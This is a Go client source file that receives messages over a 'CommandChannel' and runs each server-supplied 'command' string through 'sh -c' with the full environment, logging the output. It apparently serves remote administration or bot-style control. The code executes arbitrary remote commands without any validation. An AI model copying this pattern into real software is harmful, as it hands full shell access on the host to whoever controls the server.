package client

import (
	"bytes"
	"context"
	"os/exec"
	"strings"
	"time"
	"os"
	"encoding/json"
	"log"
)

func handleMessage(msg map[string]interface{}) {
	identifierStr, ok := msg["identifier"].(string)
	if !ok {
		log.Println("Error: Missing or invalid 'identifier' field. Full message:", msg)
		return
	}

	var id Identifier
	if err := json.Unmarshal([]byte(identifierStr), &id); err != nil {
		log.Println("Error: Failed to parse 'identifier' JSON. Full message:", msg, "Error:", err)
		return
	}

	if id.Channel != "CommandChannel" {
		log.Println("Error: Unexpected channel. Expected 'CommandChannel', got:", id.Channel)
		return
	}

	message, ok := msg["message"].(map[string]interface{})
	if !ok {
		log.Println("Error: Missing or invalid 'message' field. Full message:", msg)
		return
	}

	cmdRaw, exists := message["command"]
	if !exists {
		infoRaw, exists := message["info"]
		if exists {
			log.Println("[Info] Server: ", infoRaw)
		}	else {
			log.Println("Error: Missing 'command' field in 'message'. Full message:", msg)
		}
		return	
	}

	cmd, ok := cmdRaw.(string)
	if !ok {
		log.Println("Error: 'command' is not a string. Full message:", msg)
		return
	}
	executeCommand(cmd)
}


func executeCommand(command string) {
	// Set a timeout to avoid long-running/hanging commands
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "sh", "-c", command)
	cmd.Env = os.Environ()
	
	var output bytes.Buffer
	cmd.Stdout = &output
	cmd.Stderr = &output

	if err := cmd.Run(); err != nil {
		log.Printf("Error executing command: %v\nOutput: %s", err, strings.TrimSpace(output.String()))
		return
	}

	// Log successful command output
	log.Printf("\n%s", strings.TrimSpace(output.String()))
}
